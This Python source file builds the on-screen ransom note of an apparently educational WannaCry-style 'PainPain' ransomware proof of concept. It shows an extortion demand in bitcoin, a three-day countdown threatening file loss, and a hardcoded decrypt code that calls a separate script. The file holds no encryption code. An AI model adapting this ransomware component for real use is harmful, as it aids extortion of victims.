# GUI logic for ransomware PoC
import tkinter as tk
from tkinter import messagebox
import platform
import getpass
import socket
import subprocess
import threading
from datetime import datetime
import os

class RansomwareGUI(tk.Tk):
    """
    Main ransomware GUI window, simulating a WannaCry-style ransom note and timer.
    """
    def __init__(self, target_dir=None, payment_address='1BitcoinEaterAddressDontSendf59kuE', decrypt_cmd=None, *args, **kwargs):
        """
        Initialize the GUI window with ransom note, timer, and decryption logic.
        """
        super().__init__(*args, **kwargs)
        self.title("Ooops, your files have been encrypted!")
        self.geometry("700x540")
        self.configure(bg="#000000")
        self.resizable(False, False)
        self.target_dir = target_dir
        self.payment_address = payment_address
        self.decrypt_cmd = decrypt_cmd or ["python", "main.py", "-p", target_dir or "", "-d"]
        self.timer_seconds = 3 * 24 * 60 * 60
        self.timer_running = True
        self.skull_img = None
        self.build_gui()
        self.after(1000, self.update_timer)
        self.lift()
        self.focus_force()
        self.attributes('-topmost', True)
        self.after(500, lambda: self.attributes('-topmost', False))

    def build_gui(self):
        """
        Build the GUI layout, including ransom note, timer, and input fields.
        """
        header_frame = tk.Frame(self, bg="#000000")
        header_frame.pack(pady=(10, 0))
        skull_path = os.path.join(os.path.dirname(__file__), "skull.png")
        try:
            if os.path.exists(skull_path):
                self.skull_img = tk.PhotoImage(file=skull_path)
                skull_label = tk.Label(header_frame, image=self.skull_img, bg="#000000")
                skull_label.pack(side="top", pady=(0, 5))
            else:
                skull_label = tk.Label(header_frame, text="💀", font=("Segoe UI", 50, "bold"), fg="#ff0000", bg="#000000")
                skull_label.pack(side="top", pady=(0, 5))
        except Exception:
            skull_label = tk.Label(header_frame, text="💀", font=("Segoe UI", 50, "bold"), fg="#ff0000", bg="#000000")
            skull_label.pack(side="top", pady=(0, 5))
        header = tk.Label(header_frame, text="Ooops, your files have been encrypted!", font=("Courier", 20, "bold"), fg="#ff0000", bg="#000000")
        header.pack(side="top")

        self.timer_label = tk.Label(self, text="Time left: 72:00:00", font=("Courier", 20, "bold"), fg="#ffff00", bg="#000000")
        self.timer_label.pack(pady=(10, 10))

        note_frame = tk.Frame(self, bg="#1a0000", bd=2, relief="solid")
        note_frame.pack(padx=30, pady=10, fill="x")
        note = tk.Label(note_frame, text=(
            "YOUR DOCUMENTS, PHOTOS, DATABASES AND OTHER IMPORTANT FILES HAVE BEEN ENCRYPTED!\n\n"
            "TO RECOVER THEM, PAY ₹5,00,000 IN BITCOIN TO THE ADDRESS BELOW.\n"
            "FAILURE TO PAY WITHIN 3 DAYS WILL RESULT IN PERMANENT FILE LOSS!\n"
        ), font=("Courier", 12, "bold"), fg="#ffcc00", bg="#1a0000", justify="left", wraplength=620)
        note.pack(padx=10, pady=10)

        pay_label = tk.Label(self, text="💸 BTC PAYMENT ADDRESS", font=("Courier", 11, "bold"), fg="#ff0000", bg="#000000")
        pay_label.pack(pady=(20, 0))
        pay_addr_frame = tk.Frame(self, bg="#000000")
        pay_addr_frame.pack(pady=(0, 10))
        pay_addr = tk.Entry(pay_addr_frame, font=("Courier", 12), fg="#000000", bg="#eeeeee", width=50, justify="center")
        pay_addr.insert(0, self.payment_address)
        pay_addr.config(state="readonly")
        pay_addr.pack(side="left")
        btc_icon = tk.Label(pay_addr_frame, text="₿", font=("Courier", 18, "bold"), fg="#ff9900", bg="#000000")
        btc_icon.pack(side="left", padx=(8, 0))

        entry_frame = tk.Frame(self, bg="#000000")
        entry_frame.pack(pady=(20, 10), padx=30, fill="x")

        self.code_var = tk.StringVar()
        code_entry = tk.Entry(entry_frame, textvariable=self.code_var,
                              font=("Courier", 14, "bold"), fg="#000000", bg="#fff8e1",
                              width=25, justify="center", bd=3, relief="solid")
        code_entry.pack(side="left", expand=True, fill="x", padx=(0, 10), ipady=6)

        self.decrypt_btn = tk.Button(entry_frame, text="💾 Decrypt Files",
                                     font=("Courier", 12, "bold"),
                                     bg="#33cc33", fg="black",
                                     width=20, command=self.try_decrypt,
                                     bd=3, relief="raised")
        self.decrypt_btn.pack(side="left", ipady=6)

        footer = tk.Label(self, text="PainPain Ransomware PoC - FOR EDUCATIONAL USE ONLY", font=("Courier", 9), fg="#888888", bg="#000000")
        footer.pack(side="bottom", pady=10)

    def update_timer(self):
        """
        Update the countdown timer every second. Disable decryption when time runs out.
        """
        if self.timer_running and self.timer_seconds > 0:
            self.timer_seconds -= 1
            h, m, s = self.timer_seconds // 3600, (self.timer_seconds % 3600) // 60, self.timer_seconds % 60
            self.timer_label.config(text=f"Time left: {h:02}:{m:02}:{s:02}")
            self.after(1000, self.update_timer)
        elif self.timer_seconds == 0:
            self.timer_label.config(text="Time left: 00:00:00")
            messagebox.showerror("💀 Time's up!", "Your files are lost forever.")
            self.decrypt_btn.config(state="disabled")

    def try_decrypt(self):
        """
        Attempt to decrypt files if the correct code is entered.
        """
        code = self.code_var.get().strip().lower()
        if code == "bitcoin":
            self.timer_running = False
            self.decrypt_btn.config(state="disabled")
            self.run_decrypt_command()
        else:
            messagebox.showerror("Wrong Code", "Invalid decryption code. Try again.")

    def run_decrypt_command(self):
        """
        Run the decryption command in a background thread and show the result.
        """
        def do_decrypt():
            try:
                result = subprocess.run(self.decrypt_cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    messagebox.showinfo("Success", "PainPain Ransomware activity ended, your files are decrypted.\nThis window will close in 1 second.")
                    self.after(1000, self.destroy)
                else:
                    messagebox.showerror("Decryption Error", f"Decryption failed.\n\n{result.stderr}")
            except Exception as e:
                messagebox.showerror("Execution Failed", f"Could not run decrypt command.\n\n{e}")
        threading.Thread(target=do_decrypt, daemon=True).start()

    @staticmethod
    def get_local_ip():
        """
        Retrieve the local IP address of the machine.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return 'Unknown'

if __name__ == "__main__":
    import sys
    target_dir = sys.argv[1] if len(sys.argv) > 1 else None
    app = RansomwareGUI(target_dir=target_dir)
    app.mainloop() 